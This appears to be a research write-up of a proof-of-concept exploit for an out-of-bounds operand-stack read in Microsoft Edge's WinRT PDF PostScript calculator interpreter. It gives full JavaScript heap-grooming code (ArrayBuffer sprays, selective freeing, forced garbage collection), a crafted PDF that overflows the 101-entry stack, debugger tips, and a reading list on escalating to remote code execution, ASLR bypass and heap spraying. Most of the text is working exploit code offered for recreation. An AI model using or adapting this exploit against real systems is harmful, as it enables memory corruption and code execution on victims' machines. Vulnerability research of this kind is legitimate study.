Overview: Microsoft Edge uses WinRT PDF to render pdf documents. WinRT PDF PostScript interpreter for Type 4 (PostScript Calculator) functions use a subset of the PostScript language operators and these PostScript operators use the PostScript operand stack when performing their functions.

The PostScript operand stack is a data structure containing 0x65 (101) CType4Operand pointers. Each pointers has 2 DWORDS, 1 representing type and 1 representing value.

PostScript interpreter fails to validate if the PostScript operand stack index is past the end of the PostScript operand stack (PostScript operand stack index is 0x65), allowing a dereference of a CType4Operand pointer located right after the end of the PostScript operand stack.

```
<script>
var controlledBuffer1 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array1 = new Int32Array(controlledBuffer1, 0x328) // set offset to 0x328
int32Array1[0] = 0x42424242;
int32Array1[1] = 0x42424242;

var controlledBuffer2 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array2 = new Int32Array(controlledBuffer2, 0x328) // set offset to 0x328
int32Array2[0] = 0x42424242;
int32Array2[1] = 0x42424242;

var controlledBuffer3 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array3 = new Int32Array(controlledBuffer3, 0x328) // set offset to 0x328
int32Array3[0] = 0x42424242;
int32Array3[1] = 0x42424242;

var controlledBuffer4 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array4 = new Int32Array(controlledBuffer4, 0x328) // set offset to 0x328
int32Array4[0] = 0x42424242;
int32Array4[1] = 0x42424242;

var controlledBuffer5 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array5 = new Int32Array(controlledBuffer5, 0x328) // set offset to 0x328
int32Array5[0] = 0x42424242;
int32Array5[1] = 0x42424242;

var controlledBuffer6 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array6 = new Int32Array(controlledBuffer6, 0x328) // set offset to 0x328
int32Array6[0] = 0x42424242;
int32Array6[1] = 0x42424242;

var controlledBuffer7 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array7 = new Int32Array(controlledBuffer7, 0x328) // set offset to 0x328
int32Array7[0] = 0x42424242;
int32Array7[1] = 0x42424242;

var controlledBuffer8 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array8 = new Int32Array(controlledBuffer8, 0x328) // set offset to 0x328
int32Array8[0] = 0x42424242;
int32Array8[1] = 0x42424242;

var controlledBuffer9 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array9 = new Int32Array(controlledBuffer9, 0x328) // set offset to 0x328
int32Array9[0] = 0x42424242;
int32Array9[1] = 0x42424242;

var controlledBuffer10 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array10 = new Int32Array(controlledBuffer10, 0x328) // set offset to 0x328
int32Array10[0] = 0x42424242;
int32Array10[1] = 0x42424242;

var controlledBuffer11 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array11 = new Int32Array(controlledBuffer11, 0x328) // set offset to 0x328
int32Array11[0] = 0x42424242;
int32Array11[1] = 0x42424242;

var controlledBuffer12 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array12 = new Int32Array(controlledBuffer12, 0x328) // set offset to 0x328
int32Array12[0] = 0x42424242;
int32Array12[1] = 0x42424242;

var controlledBuffer13 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array13 = new Int32Array(controlledBuffer13, 0x328) // set offset to 0x328
int32Array13[0] = 0x42424242;
int32Array13[1] = 0x42424242;

var controlledBuffer14 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array14 = new Int32Array(controlledBuffer14, 0x328) // set offset to 0x328
int32Array14[0] = 0x42424242;
int32Array14[1] = 0x42424242;

var controlledBuffer15 = new ArrayBuffer(0x340); // create an allocation of 0x340
var int32Array15 = new Int32Array(controlledBuffer15, 0x328) // set offset to 0x328
int32Array15[0] = 0x42424242;
int32Array15[1] = 0x42424242;

alert("Step 1 completed");

lfhBucketActivations = []
for (var blockSize = 0x1 ; blockSize <= 0x320 ; blockSize++) {
    console.log(blockSize);
    for (var j = 0 ; j < 17; j++) {
        lfhBucketActivations.push(new ArrayBuffer(blockSize)); // step 2
    }
}

alert("Step 2 completed");

let useThemBuffers1 = int32Array1
console.log(useThemBuffers1)
let useThemBuffers2 = controlledBuffer1
console.log(useThemBuffers2)

controlledBuffer2 = null;
int32Array2 = null

let useThemBuffers3 = int32Array3
console.log(useThemBuffers3)
let useThemBuffers4 = controlledBuffer3
console.log(useThemBuffers4)

controlledBuffer4 = null;
int32Array4 = null

let useThemBuffers5 = int32Array5
console.log(useThemBuffers5)
let useThemBuffers6 = controlledBuffer5
console.log(useThemBuffers6)

controlledBuffer6 = null;
int32Array6 = null

let useThemBuffers7 = int32Array7
console.log(useThemBuffers7)
let useThemBuffers8 = controlledBuffer7
console.log(useThemBuffers8)

controlledBuffer8 = null;
int32Array8 = null

let useThemBuffers9 = int32Array9
console.log(useThemBuffers9)
let useThemBuffers10 = controlledBuffer9
console.log(useThemBuffers10)

controlledBuffer10 = null;
int32Array10 = null

let useThemBuffers11 = int32Array11
console.log(useThemBuffers11)
let useThemBuffers12 = controlledBuffer11
console.log(useThemBuffers12)

controlledBuffer12 = null;
int32Array12 = null

let useThemBuffers13 = int32Array13
console.log(useThemBuffers13)
let useThemBuffers14 = controlledBuffer13
console.log(useThemBuffers14)

controlledBuffer14 = null;
int32Array14 = null

let useThemBuffers15 = int32Array15
console.log(useThemBuffers15)
let useThemBuffers16 = controlledBuffer15
console.log(useThemBuffers16)

let largeBuffer = new ArrayBuffer(192 * 1024 * 1024); // trigger garbage collection

setTimeout(() => {
    alert("Step 3 completed!!!");

    // Create the first set of elements
    var h1_2 = document.createElement("h1");
    var embed_2 = document.createElement("embed");

    h1_2.textContent = "test pdf";
    embed_2.src = "test.pdf";
    embed_2.width = "25px";
    embed_2.height = "25px";

    document.body.appendChild(h1_2);
    document.body.appendChild(embed_2);
}, 2000); 
</script>
<div>
</div>
```

```
%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R ]
     /Count 1
     /MediaBox [0 0 300 300]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources << /Shading << /S1 5 0 R >> >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 25 >>
stream
q 1 0 0 1 0 0 cm /S1 sh Q
endstream
endobj

5 0 obj
  << /ShadingType 3
     /ColorSpace /DeviceCMYK
     /Coords [150 150 30 150 150 175]
     /Extend [true true]
     /Function 6 0 R
  >>
endobj

6 0 obj
  << /FunctionType 4
     /Domain [0 1]
     /Range [0 1 0 1 0 1 0 1]
     /Length 366
  >>
stream
{
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
1094795585
}
endstream
endobj

xref
0 7
0000000000 65535 f 
0000000010 00000 n 
0000000069 00000 n 
0000000171 00000 n 
0000000298 00000 n 
0000000376 00000 n 
0000000530 00000 n 
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
1021
%%EOF
```

Things to note:

- Edge spawns 2 Content Processes, only one of them has the logics to manage PDFs (attach to CREDAT value ending with 545)

- Ensure that your postscript calculator function can be detected by setting the following breakpoint: `bp windows_data_pdf!CPostScriptEvaluator::_Evaluate+0xa9`

Stuff that can help you to recreate this exploit:

- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Int32Array/Int32Array

- https://github.com/markyason/markyason.github.io

- https://securityintelligence.com/?s=WinRT

- https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-028

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0117

- https://github.com/RUB-NDS/PDF101/blob/master/01-testsuite/01-dos/01-infinite-loop/D-calculation-loops/D3-func-call-recursion.pdf

- https://owasp.org/www-chapter-germany/stammtische/hamburg/assets/slides/2020-12-09_Portable%20Document%20Flaws%20101.pdf

- https://opensource.adobe.com/dc-acrobat-sdk-docs/pdfstandards/pdfreference1.4.pdf

- https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Exploiting-Windows-COMWinRT-Services.pdf

- https://stackoverflow.com/questions/41625970/relation-between-com-and-winrt

- https://github.com/NattiSamson/CVE-2021-21042/issues/1

6. Personal Research: Escalate Write Primative to RCE

- ASLR Bypass

- Heap Spray

https://github.com/exp-sky/HitCon-2016-Windows-10-x64-edge-0day-and-exploit/blob/master/Windows%2010%20x64%20edge%200day%20and%20exploit.pdf

http://2016gitc.thegitc.com/ppt2016bj/Windows-10-x64-edge-0day-and-exploit.pdf

https://paper.bobylive.com/Security/Windows_10_x64_Edge_Browser_0day_and_exploit.pdf

https://www.blackhat.com/docs/eu-15/materials/eu-15-Chen-Hey-Man-Have-You-Forgotten-To-Initialize-Your-Memory.pdf

https://www.blackhat.com/docs/us-16/materials/us-16-Molinyawe-Shell-On-Earth-From-Browser-To-System-Compromise-wp.pdf

http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html

https://paper.seebug.org/131/

https://connormcgarr.github.io/type-confusion-part-3/

https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf

https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/

https://stackoverflow.com/questions/10888391/error-link-fatal-error-lnk1123-failure-during-conversion-to-coff-file-inval

https://www.zerodayinitiative.com/blog/2019/5/21/rce-without-native-code-exploitation-of-a-write-what-where-in-internet-explorer

https://www.blackhat.com/docs/eu-16/materials/eu-16-Wen-Use-After-Use-After-Free-Exploit-UAF-By-Generating-Your-Own-wp.pdf

https://hitcon.org/2015/ENT/PDF/Spartan%200day%20&%20Exploit_exp-sky.pdf

https://www.doc.ic.ac.uk/~livshits/classes/CO445H/slides/LEC4.pdf

https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf

https://labs.withsecure.com/publications/internet-exploiter-understanding-vulnerabilities-in-internet-explorer

https://blog.checkpoint.com/research/too-much-freedom-is-dangerous-understanding-ie-11-cve-2015-2419-exploitation/

https://blog.checkpoint.com/wp-content/uploads/2016/02/cve-2015-2419-POC.txt

https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html

https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/

https://comsec.ethz.ch/wp-content/files/dedup-est-machina_sp16.pdf

https://www.silentgrid.com/blog/cve-to-poc-cve-2017-0059/

https://www.silentgrid.com/blog/cve-to-poc-cve-2017-0037/

https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=226903

https://googleprojectzero.blogspot.com/2015/06/dude-wheres-my-heap.html

http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html